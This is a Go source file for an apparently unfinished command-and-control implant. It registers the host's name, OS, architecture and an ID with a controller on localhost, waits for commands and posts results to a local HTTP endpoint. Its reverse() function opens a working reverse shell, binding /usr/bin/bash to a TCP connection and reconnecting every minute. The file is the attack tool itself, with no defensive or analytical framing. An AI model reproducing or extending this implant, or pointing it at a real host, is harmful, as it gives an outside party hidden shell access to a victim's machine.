package main

import (
    "encoding/gob"
    "fmt"
    "log"
    "math/rand"
    "net"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "time"
    "bytes"
    "encoding/json"
    "github.com/google/uuid"
    "net/http"
)

const (
    SERVER_HOST = "localhost"
    SERVER_PORT = "9988"
    SERVER_TYPE = "tcp"
)

type Client struct {
    Hostname string
    Os       string
    Arch     string
    IP       string
    Port     string
    Uid      string
}

func (cli *Client) generateRandomId() {
    id := uuid.New()
    cli.Uid = id.String()
}

func (cli *Client) getClientOsAndArch() {
    cli.Os = runtime.GOOS
    cli.Arch = runtime.GOARCH
}

// TODO: Only handles linux for now
func (cli *Client) getHostName() {
    cli.Hostname, _ = os.Hostname()
}

// Debug function that generates random numbers to use in Port
func randInt(min int, max int) int {
    return min + rand.Intn(max-min)
}


func createNewCli() Client{
    rand.Seed(time.Now().UTC().UnixNano())
    randomPort := randInt(9000, 9999)
    
    client := Client{IP: "localhost", Port: strconv.Itoa(randomPort)}
    client.generateRandomId()
    client.getClientOsAndArch()
    client.getHostName()

    return client
}

// Function to register on server socket
func registerOnServerSocket() (Client, error) {
    conn, err := net.Dial(SERVER_TYPE, SERVER_HOST+":"+SERVER_PORT)
    if err != nil {
        log.Println("Error connecting:", err.Error())
        return Client{}, err
    }

    //log.Println("Connected with server")

    // Send client struct to register in server socket
    encoder := gob.NewEncoder(conn)
    client := createNewCli()
    encoder.Encode(client)

    return client, nil
}

// Function that verifies if client was registered
func verifyRegister(client Client)  (net.Listener, error) {
    // Get info from server to verify if we are registered
    clientSocket, err := net.Listen("tcp", client.IP+":"+client.Port)
    if err != nil {
        log.Println("Error listening:", err.Error())
        return nil, err
    }

    //fmt.Println("Listening on client socket")

    connection, err := clientSocket.Accept()
    if err != nil {
        log.Println("Error accepting server message:", err.Error())
        return nil, err
    }
    
    serverMsg := make([]byte, 1024)
    serverMsgLen, err := connection.Read(serverMsg)


    if string(serverMsg[:serverMsgLen]) != "REGISTERED" {
        return nil, fmt.Errorf("Something went wrong and the client was not registered by server")
    }
    
    //fmt.Println(string(serverMsg[:serverMsgLen])) // DEBUG mensage with REGISTERED string
    fmt.Println("OK!")

    return clientSocket, nil
}


// Struct to handle data to respond
type Data struct {
    Command string    `json:"command"`
    Result  string    `json:"result"`
    Time    string    `json:"time"`
}

//curl -X POST http://localhost:8080 -H 'Content-Type: application/json' -d '{"command":"my command","result":"my result", "time":"my time"}'

// Function to send request to server API
func respondToServer(command, result string) error {
    data := &Data{
        Command:  command,
        Result:   result,
        Time:     "my time",    // TODO: get the real timestamp
    }

    tempBuffer := new(bytes.Buffer)
    err := json.NewEncoder(tempBuffer).Encode(data)
    if err != nil {
        return err
    }

    resp, err := http.Post("http://localhost:8080/", "application/json", tempBuffer) // TODO: fix this hardcoded stuff
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func reverse(host string) {
    for {
        c, err := net.Dial("tcp", host)
        if nil != err {
            if nil != c {
                c.Close()
            }
            time.Sleep(time.Minute)
            reverse(host)
        }

        cmd := exec.Command("/usr/bin/bash")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
        c.Close()
    }
}

// Function that recieves commands from server
func getCommands(client Client, clientSocket net.Listener) error {
    for {
        defer clientSocket.Close()

        connection, err := clientSocket.Accept()
        if err != nil {
            log.Println("Error accepting server message:", err.Error())
            return err
        }

        serverCommand := make([]byte, 1024)
        serverCommandLen, err := connection.Read(serverCommand)

        if err != nil {
            return err
        }

        // TODO: I was here
        if string(serverCommand[:serverCommandLen]) == "shell" {
            reverse("127.0.0.1:9991")
        }

    }
}


// Function that handles the errors
func run() error {
    client, err := registerOnServerSocket()
    if  err != nil {
        return err
    }

    // Verifies if the register was well done
    var clientSocket net.Listener

    if clientSocket, err = verifyRegister(client); err != nil {
        return err
    }

    // Waits for commands from server
    getCommands(client, clientSocket)
   
   return nil
}

func main() {
    if err := run(); err != nil {
        fmt.Fprint(os.Stderr, err)
        os.Exit(1)
    }
}
